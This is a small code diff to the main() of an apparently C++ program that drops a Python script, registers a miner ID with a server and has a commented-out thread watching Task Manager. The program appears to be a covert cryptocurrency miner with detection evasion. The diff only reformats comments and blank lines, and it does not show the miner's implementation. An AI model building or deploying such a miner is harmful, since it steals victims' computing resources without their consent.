@@ -7,8 +7,6 @@
 #include "utils.h"
 
 
-
-
 int main(int argc, char * argv[]){
 
     std::cout << "Dropping python script on machine" << std::endl;
@@ -21,8 +19,8 @@ int main(int argc, char * argv[]){
     std::cout << "Sending to server the miner ID ..." << std::endl;
     new_miner();
 
-    //std::cout << "Starting thread to mine ..." << std::endl;
-    //std::thread multithreading(Tasks::check_task_manager); // thread creation
+    // std::cout << "Starting thread to mine ..." << std::endl;
+    // std::thread multithreading(Tasks::check_task_manager); // thread creation
     // Tasks::check_task_manager();
     // if(Tasks::lock_task_manager){
     //     std::cout << "true" << std::endl;
@@ -30,7 +28,7 @@ int main(int argc, char * argv[]){
     //     std::cout << "false" << std::endl;
     // }
 
-    // desalocate memory
+    // // desalocate memory
     // free(pool->id);
     // free(pool->pool);
     // free(pool);
